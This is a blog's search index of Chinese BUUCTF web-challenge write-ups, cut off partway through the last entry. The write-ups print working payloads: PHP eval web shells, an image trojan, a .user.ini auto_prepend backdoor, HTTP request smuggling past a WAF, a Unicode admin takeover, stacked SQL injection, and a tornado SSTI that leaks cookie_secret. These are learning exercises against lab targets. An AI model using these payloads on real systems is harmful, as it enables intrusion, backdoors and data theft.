<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>BUUCTF CheckIn</title>
      <link href="/LawlietLW.github.io/2019/12/23/buuctf-checkin/"/>
      <url>/LawlietLW.github.io/2019/12/23/buuctf-checkin/</url>
      
        <content type="html"><![CDATA[<p>打开环境，是一个文件上传页面<br><img src="/LawlietLW.github.io/2019/12/23/BUUCTF-CheckIn/1.jpg" alt=""></p><a id="more"></a><p>先查看一下源代码，看看有没有客户端校验<br><img src="/LawlietLW.github.io/2019/12/23/BUUCTF-CheckIn/7.jpg" alt=""><br>显然没有客户端校验<br>首先上传一个图片，检查上传功能<br><img src="/LawlietLW.github.io/2019/12/23/BUUCTF-CheckIn/2.jpg" alt=""><br>图片正常上传<br>接下来再上传一个php文件</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span></code></pre><p><img src="/LawlietLW.github.io/2019/12/23/BUUCTF-CheckIn/3.jpg" alt=""><br>提示非法后缀<br>那么应该是不能接受php后缀的文件了，我们把后缀改成jpg试一下<br><img src="/LawlietLW.github.io/2019/12/23/BUUCTF-CheckIn/8.jpg" alt=""><br>我把content-type字段和后缀名都改了一下<br><img src="/LawlietLW.github.io/2019/12/23/BUUCTF-CheckIn/9.jpg" alt=""><br>但依然无法上传，提示检测到了非法字符<br>那我们再把一句话换一种写法</p><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>php<span class="token punctuation">'</span></span><span class="token punctuation">></span></span></span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span></code></pre><p>继续上传<br>得到了这样的反馈<br><img src="/LawlietLW.github.io/2019/12/23/BUUCTF-CheckIn/10.jpg" alt=""></p><pre class=" language-bash"><code class="language-bash">exif_imagetype<span class="token punctuation">(</span><span class="token punctuation">)</span> 读取一个图像的第一个字节并检查其签名。</code></pre><p>这里是有文件内容头校验<br>不同的图片形式的文件头如下</p><pre class=" language-bash"><code class="language-bash">JPG ：FF D8 FF E0 00 10 4A 46 49 46GIF<span class="token punctuation">(</span>相当于文本的GIF89a<span class="token punctuation">)</span>：47 49 46 38 39 61PNG： 89 50 4E 47</code></pre><p>给我们的shell加上GIF文件的文件头，继续上传<br><img src="/LawlietLW.github.io/2019/12/23/BUUCTF-CheckIn/11.jpg" alt=""><br>上传成功<br>但上传成功了该如何利用呢，图片马需要有文件包含漏洞或者解析漏洞才能够利用，但这道题并没有相应的漏洞<br>接下来就是我从这道题里面学到的新姿势了<br>先贴上P牛的链接<br><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html" target="_blank" rel="noopener">.user.ini文件构成的PHP后门</a></p><p>php.ini是php默认的配置文件，其中包括了很多php的配置<br><img src="/LawlietLW.github.io/2019/12/23/BUUCTF-CheckIn/12.jpg" alt=""><br>而.user.ini实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置<br>而且，和php.ini不同的是，.user.ini是一个能被动态加载的ini文件<br>所以，我们能轻易地用.user.ini文件构造出一个PHP后门<br>Php配置项中有两个比较有意思的项<br>auto_append_file、auto_prepend_file<br>其中auto_prepend_file指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数<br>auto_append_file则是在文件后面包含<br>也就是说，.user.ini文件相当于创造了文件包含的机会<br>用法也简单，直接写入.user.ini文件即可</p><p>所以，本题中，我们只需要先创建一个.user.ini文件<br><img src="/LawlietLW.github.io/2019/12/23/BUUCTF-CheckIn/13.jpg" alt=""><br>同样需要在.user.ini文件前加入GIF文件头<br>再创建一个图片马<br>可以使用copy命令</p><pre class=" language-bash"><code class="language-bash">copy shell.jpg/b+shell.php/a shell.jpg</code></pre><p>也可以使用一个叫edjpgcom的工具来生成图片马</p><p>首先上传我们的.user.ini文件<br><img src="/LawlietLW.github.io/2019/12/23/BUUCTF-CheckIn/14.jpg" alt=""><br>然后上传图片马<br><img src="/LawlietLW.github.io/2019/12/23/BUUCTF-CheckIn/15.jpg" alt=""><br>访问一下上传的位置<br><img src="/LawlietLW.github.io/2019/12/23/BUUCTF-CheckIn/16.jpg" alt=""><br>蚁剑连接<br><img src="/LawlietLW.github.io/2019/12/23/BUUCTF-CheckIn/17.jpg" alt=""><br>成功拿到flag</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> .user.ini文件的利用，文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF Easy Calc</title>
      <link href="/LawlietLW.github.io/2019/12/22/buuctf-easy-calc/"/>
      <url>/LawlietLW.github.io/2019/12/22/buuctf-easy-calc/</url>
      
        <content type="html"><![CDATA[<p>打开环境<br><img src="/LawlietLW.github.io/2019/12/22/BUUCTF-Easy-Calc/1.jpg" alt=""></p><a id="more"></a><p>查看源代码</p><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>I've <span class="token keyword">set</span> up WAF to ensure security<span class="token punctuation">.</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#calc'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>            url<span class="token punctuation">:</span><span class="token string">"calc.php?num="</span><span class="token operator">+</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#content"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            type<span class="token punctuation">:</span><span class="token string">'GET'</span><span class="token punctuation">,</span>            success<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#result"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`&lt;div class="alert alert-success">            &lt;strong>答案:&lt;/strong></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>data<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">            &lt;/div>`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">,</span>            error<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"这啥?算不来!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>有一个<code>calc.php</code>,跟进去看看<br>发现waf代码</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'\t'</span><span class="token punctuation">,</span> <span class="token string">'\r'</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token string">'\''</span><span class="token punctuation">,</span> <span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">'`'</span><span class="token punctuation">,</span> <span class="token string">'\['</span><span class="token punctuation">,</span> <span class="token string">'\]'</span><span class="token punctuation">,</span><span class="token string">'\$'</span><span class="token punctuation">,</span><span class="token string">'\\'</span><span class="token punctuation">,</span><span class="token string">'\^'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$blackitem</span> <span class="token punctuation">.</span> <span class="token string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"what are you want to do?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'echo '</span><span class="token punctuation">.</span><span class="token variable">$str</span><span class="token punctuation">.</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span> </code></pre><p>waf过滤了’ ‘,’\t’,’\r’,’\n’,’'‘,’”‘,’`’,’[‘,’]’,’$’,’'<br>其中以get方式给num传参</p><p>由于前端设置了waf，所以只要我们的访问请求中包含非法字符就会返回403，无法访问到后端<br>在这样的情况下我们就可以使用HTTP走私来绕过前端waf直接访问后端</p><p>关于HTTP走私的介绍网上有许多师傅做了讲解，在这里就不多叙述了<br>(HTTP走私)[<a href="https://xz.aliyun.com/t/6654]" target="_blank" rel="noopener">https://xz.aliyun.com/t/6654]</a><br>(http请求走私(HTTP Request Smuggling))[<a href="https://blog.csdn.net/qq_37865996/article/details/102529396]" target="_blank" rel="noopener">https://blog.csdn.net/qq_37865996/article/details/102529396]</a><br>贴两个链接</p><p>在这里，我们可以使用CL-CL方式来进行http走私，当然其他的方式也一样可以<br><img src="/LawlietLW.github.io/2019/12/22/BUUCTF-Easy-Calc/2.jpg" alt=""><br>前端服务器读取完num=1之后，将数据包原封不动地转发给后端，后端读取到<code>?num=phpinfo()</code>后，返回给我们<code>phpinfo()</code><br>在这一题里有几个PHP函数需要我们注意</p><pre class=" language-bash"><code class="language-bash">scandir<span class="token punctuation">(</span><span class="token punctuation">)</span> 函数返回指定目录中的文件和目录的数组。var_dump<span class="token punctuation">(</span><span class="token punctuation">)</span>函数：var_dump<span class="token punctuation">(</span><span class="token punctuation">)</span> 函数用于输出变量的相关信息。var_dump<span class="token punctuation">(</span><span class="token punctuation">)</span> 函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。readfile<span class="token punctuation">(</span><span class="token punctuation">)</span> 函数输出一个文件。该函数读入一个文件并写入到输出缓冲。若成功，则返回从文件中读入的字节数。若失败，则返回false。您可以通过 @readfile<span class="token punctuation">(</span><span class="token punctuation">)</span> 形式调用该函数，来隐藏错误信息。</code></pre><p>我们可以使用<code>scandir("\")</code>来扫描根目录，但””被禁了，所以这样子不行，我们可以把\转为ASCII码，然后再转为字符，</p><pre class=" language-bash"><code class="language-bash">chr<span class="token punctuation">(</span><span class="token punctuation">)</span>chr<span class="token punctuation">(</span><span class="token punctuation">)</span> 函数从指定的 ASCII 值返回字符。ASCII 值可被指定为十进制值、八进制值或十六进制值。八进制值被定义为带前置 0，而十六进制值被定义为带前置 0x。</code></pre><p>所以我们可以构造成<code>scandir(chr(47))</code>来扫描根目录<br><img src="/LawlietLW.github.io/2019/12/22/BUUCTF-Easy-Calc/3.jpg" alt=""><br>找到了flag存放的目录<br>接下来，我们需要从f1agg目录中读取flag<br>构造payload</p><pre class=" language-bash"><code class="language-bash">?num<span class="token operator">=</span>var_dump<span class="token punctuation">(</span>readfile<span class="token punctuation">(</span>chr<span class="token punctuation">(</span>47<span class="token punctuation">)</span>.chr<span class="token punctuation">(</span>102<span class="token punctuation">)</span>.chr<span class="token punctuation">(</span>49<span class="token punctuation">)</span>.chr<span class="token punctuation">(</span>97<span class="token punctuation">)</span>.chr<span class="token punctuation">(</span>103<span class="token punctuation">)</span>.chr<span class="token punctuation">(</span>103<span class="token punctuation">))</span><span class="token punctuation">)</span></code></pre><p><code>chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)</code>就是/f1agg<br><img src="/LawlietLW.github.io/2019/12/22/BUUCTF-Easy-Calc/4.jpg" alt=""><br>flag到手</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> http走私 </tag>
            
            <tag> PHP的字符串解析特性 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF admin</title>
      <link href="/LawlietLW.github.io/2019/12/21/buuctf-admin/"/>
      <url>/LawlietLW.github.io/2019/12/21/buuctf-admin/</url>
      
        <content type="html"><![CDATA[<p>打开环境，有注册和登录两个功能<br><img src="/LawlietLW.github.io/2019/12/21/BUUCTF-admin/1.jpg" alt=""></p><a id="more"></a><p>查看源代码，看到提示<br><img src="/LawlietLW.github.io/2019/12/21/BUUCTF-admin/2.jpg" alt=""><br>猜测需要以admin账号登陆才能拿到flag<br>那么先注册一个账号看看(admin账号已被注册)<br>注册账号后一共有四个选项<br><img src="/LawlietLW.github.io/2019/12/21/BUUCTF-admin/3.jpg" alt=""><br>首先看到post功能<br><img src="/LawlietLW.github.io/2019/12/21/BUUCTF-admin/4.jpg" alt=""><br>一个编辑留言的地方，可能会有xss之类的漏洞？我不太清楚，因为我目前并不会xss<br>再看到change password功能，查看源代码<br><img src="/LawlietLW.github.io/2019/12/21/BUUCTF-admin/5.jpg" alt=""><br>给出了源代码的GitHub地址<br>那就过去看看<br>分析routes.py<br>路由的功能不多，注册，登录，登出，编辑和修改密码</p><pre class=" language-python"><code class="language-python">@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/register'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/logout'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/change'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">change</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/edit'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></code></pre><p>从注册开始分析<br>注意到接收username这里使用了一个<code>strlower</code>函数<br>看起来是使字符串小写的函数，但python内置<code>lower()</code>函数，为什么要自己写一个函数</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    form <span class="token operator">=</span> RegisterForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> strlower<span class="token punctuation">(</span>form<span class="token punctuation">.</span>username<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre><p>事实上，不止注册这里，登录和修改密码处同样使用了<code>strlower</code>函数</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    form <span class="token operator">=</span> LoginForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> strlower<span class="token punctuation">(</span>form<span class="token punctuation">.</span>username<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">def</span> <span class="token function">change</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token operator">not</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    form <span class="token operator">=</span> NewpasswordForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> strlower<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre><p>那我们就去看看这个<code>strlower</code>函数是什么样的</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">strlower</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> nodeprep<span class="token punctuation">.</span>prepare<span class="token punctuation">(</span>username<span class="token punctuation">)</span>    <span class="token keyword">return</span> username</code></pre><p>这里面使用了nodeprep.prepare()函数，这个函数对应的库是twisted<br><img src="/LawlietLW.github.io/2019/12/21/BUUCTF-admin/6.jpg" alt=""><br><img src="/LawlietLW.github.io/2019/12/21/BUUCTF-admin/7.jpg" alt=""><br>这么一对比，发现源码中使用的twisted库的版本实在太低了<br><a href="https://panda1g1.github.io/2018/11/15/HCTF%20admin/" target="_blank" rel="noopener">参考这篇文章</a><br>这样一来我们就能形成一个攻击链<br>登陆时会调用一次<code>strlower</code>，修改密码时又会调用一次<code>strlower</code>，只要我们的用户名经过两次调用后变成了admin，我们就可以修改admin用户的密码然后重新登陆了</p><pre class=" language-bash"><code class="language-bash">ᴬᴰᴹᴵᴺ -<span class="token operator">></span> ADMIN -<span class="token operator">></span> admin</code></pre><p>admin的Unicode编码可以在网上找到<br><img src="/LawlietLW.github.io/2019/12/21/BUUCTF-admin/8.jpg" alt=""><br>成功拿到flag</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Unicode欺骗 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF EasySQL</title>
      <link href="/LawlietLW.github.io/2019/12/21/buuctf-easysql/"/>
      <url>/LawlietLW.github.io/2019/12/21/buuctf-easysql/</url>
      
        <content type="html"><![CDATA[<p><img src="/LawlietLW.github.io/2019/12/21/BUUCTF-EasySQL/1.jpg" alt=""></p><a id="more"></a><p>这题和强网杯随便注一样，都是堆叠注入<br><img src="/LawlietLW.github.io/2019/12/21/BUUCTF-EasySQL/2.jpg" alt=""><br><img src="/LawlietLW.github.io/2019/12/21/BUUCTF-EasySQL/3.jpg" alt=""><br>通过show tables可以看到Flag表<br>但想要看到列就不行了<br><img src="/LawlietLW.github.io/2019/12/21/BUUCTF-EasySQL/4.jpg" alt=""><br>通过burpfuzz一下，能看到过滤了挺多关键字的</p><hr><p>有点难顶，只能看wp了</p><pre class=" language-sql"><code class="language-sql">官方解:<span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">set</span> sql_mode<span class="token operator">=</span>pipes_as_concat<span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token number">1</span></code></pre><p>而这道题的sql语句是这样的</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> $post<span class="token punctuation">[</span><span class="token string">'query'</span><span class="token punctuation">]</span><span class="token operator">||</span>flag <span class="token keyword">from</span> Flag</code></pre><p>拼接一下就变成了这样</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">set</span> sql_mode<span class="token operator">=</span>pipes_as_concat<span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token number">1</span> <span class="token operator">||</span>flag <span class="token keyword">from</span> Flag</code></pre><p>关于 sql_mode :<br>它定义了 MySQL 应支持的 SQL 语法，以及应该在数据上执行何种确认检查，其中的 PIPES_AS_CONCAT 将 || 视为字符串的连接操作符而非 “或” 运算符<br><a href="https://www.cnblogs.com/piperck/p/9835695.html" target="_blank" rel="noopener">MySQL sql_mode 说明</a><br>所以，当set sql_mode=pipes_as_concat执行后，会把select 1和select flag的结果拼接起来<br>老实说，我实在想不出来这题的sql语句竟然是这样的<br>还是我太菜了<br>所以我更倾向于非预期解</p><pre class=" language-bash"><code class="language-bash">*,1</code></pre><p>拼接到sql语句中就是</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token operator">||</span>flag <span class="token keyword">from</span> Flag</code></pre><p>这样就是选择所有，一样能爆flag</p><p>总的来说，无论是官方解还是非预期解，我都能从中学到一些东西，一个扩宽知识面，一个开阔思路</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 堆叠注入 </tag>
            
            <tag> mysql_sql_mode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF easy_tornado</title>
      <link href="/LawlietLW.github.io/2019/12/21/buuctf-easy-tornado/"/>
      <url>/LawlietLW.github.io/2019/12/21/buuctf-easy-tornado/</url>
      
        <content type="html"><![CDATA[<p>打开环境<br><img src="/LawlietLW.github.io/2019/12/21/BUUCTF-easy-tornado/1.jpg" alt=""></p><a id="more"></a><p>有三个页面，挨个访问看看</p><pre class=" language-bash"><code class="language-bash">/flag.txt</code></pre><p><img src="/LawlietLW.github.io/2019/12/21/BUUCTF-easy-tornado/2.jpg" alt=""></p><pre class=" language-bash"><code class="language-bash">/welcome.txt</code></pre><p><img src="/LawlietLW.github.io/2019/12/21/BUUCTF-easy-tornado/3.jpg" alt=""></p><pre class=" language-bash"><code class="language-bash">/hints.txt</code></pre><p><img src="/LawlietLW.github.io/2019/12/21/BUUCTF-easy-tornado/4.jpg" alt=""><br>开始分析<br>第一个页面告诉我们flag in /fllllllllllllag<br>hint告诉我们</p><pre class=" language-bash"><code class="language-bash">md5<span class="token punctuation">(</span>cookie_secret+md5<span class="token punctuation">(</span>filename<span class="token punctuation">))</span></code></pre><p>也就是filename的md5值加上cookie_secret再md5<br>我们想要进入到fllllllllllllag，filename已经知道了，剩下cookie_secret不知道<br>在测试的过程中，会出现这样一个页面</p><pre class=" language-bash"><code class="language-bash">http://0bcfd0a4-e28e-441c-be11-1fe0c4b7afa1.node3.buuoj.cn/error?msg<span class="token operator">=</span>Error</code></pre><p>通过百度知道<br>tornado是python中的一个web应用框架<br>render是python中的一个渲染函数，渲染变量到模板中，即可以通过传递不同的参数形成不同的页面。<br>再加上error?msg=Error这个页面<br>怀疑存在<a href="https://www.freebuf.com/vuls/83999.html" target="_blank" rel="noopener">服务端模板注入攻击(SSTI)</a><br>经过测试，确实存在模板注入<br><img src="/LawlietLW.github.io/2019/12/21/BUUCTF-easy-tornado/5.jpg" alt=""><br>然后通过查阅各种资料，发现对于tornado框架存在附属文件handler.settings<br>(<a href="https://www.cnblogs.com/bwangel23/p/4858870.html" target="_blank" rel="noopener">https://www.cnblogs.com/bwangel23/p/4858870.html</a>)<br>payload为</p><pre class=" language-bash"><code class="language-bash">http://0bcfd0a4-e28e-441c-be11-1fe0c4b7afa1.node3.buuoj.cn/error?msg<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span>handler.settings<span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>得到cookie_secret</p><pre class=" language-bash"><code class="language-bash"><span class="token string">'cookie_secret'</span><span class="token keyword">:</span> <span class="token string">'c9c4e7d6-252c-47f9-a4d2-c2d67afcd4b7'</span><span class="token punctuation">}</span></code></pre><p>然后写一个脚本得到最后的filehash</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> hashlib<span class="token 